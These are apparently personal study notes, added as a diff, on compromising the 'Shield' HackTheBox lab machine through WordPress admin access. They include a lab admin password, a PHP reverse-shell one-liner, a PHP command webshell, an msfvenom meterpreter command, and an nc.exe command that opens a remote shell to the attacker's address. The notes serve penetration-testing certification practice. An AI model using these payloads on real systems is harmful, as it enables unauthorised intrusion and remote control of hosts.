@@ -14,6 +14,61 @@ going through the entire list we dont see many things that are exploitable
 take a look at the walkthrough, you are supposed to use the password from the postgres user, which doesnt make sense, but ya know
 admin:P@s5w0rd!
 
+Looking at hacktricks wordpress, it gives us a hint at what to do now that we have admin access
+
+`<?php $sock=fsockopen("10.10.14.42",6000);exec("/bin/sh -i <&3 >&3 2>&3"); ?>`
+
+Recieved the connection, but seems like that process might be terminated
+
+going ahead and trying pentestmonkey's php reverse shell
+- didnt work cause machine is windows... duh
+
+Taking a look at this one -> https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
+- that didnt work, but not sure what was up with that, will need to take a look at that one later
+
+Goind to just go with the basics
+
+`<?php echo exec($_GET['cmd']); ?>`
+
+showing we have some RCE
+
+Now we need to figure out a good way to get a shell, which is where my knowledge of windows reverse shell is very weak
+
+Need to lookup "wordpress php windows reverse shell", get a really good guide for wordpress shell uploads
+- https://www.hacknos.com/wordpress-shell-upload/
+
+Also msfvenom is allowed for the oscp, so time to learn that
+`./msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.42 LPORT=6000 -f raw -o ~/Documents/oscp-notes/htb/startpoint/Shield/shell.php`
+
+Used to create a php reverse shell
+
+Tried uploading both theme and plugins
+- went to `/wp-content/uploads/year/month/shell.php` didnt work
+- went to `/wp-content/uploads/shell.php` and that did the trick
+
+Note: the setting for this was found in the wordpress admin page settings > media, there is a little box at the bottom that lets you choose if you add the month/day to the filepath
+
+got connection, but cant seem to execute commands
+
+Taking a look at the writeup, they use msfconsole to create a shell and execute it on the machine
+- Dont really want to rely on msf so I'll take a look at what its doing differently and why I cant get a reverse shell for some reason
+- found this link how how to make a proper wp plugin -> https://www.wpexplorer.com/writing-simple-wordpress-plugin/
+- looks like when i tried to upload my shell earlier as a plugin, I was missing the header comments, cause now it works
+
+So when I activate it, it still doesnt really print any thing, Im getting a connection, but cant seem to communicate with the shell??
+
+Just going to go ahead and use my basic rce to try and get a more stable shell
+
+Possibly try uploading a staged reverse shell for windows through the theme or plugin generator, then try and execute that through the small rce you got
+
+Note: When using curl, good option is to se --data-urlencode to url encode query string
+- i.e. `curl -G "http://10.10.10.29/wordpress/index.php/2020/02/11/cyberpunk-truck/" --data-urlencode "cmd=dir wp-content\uploads"`
+- did this to read out the upload files
+- had rce, just needed to do:
+
+`nc.exe -e cmd.exe 10.10.14.29 6000`
+
+nc.exe can be uploaded through themes or plugins
 
 gobuster:
 /wp-content (Status: 301)
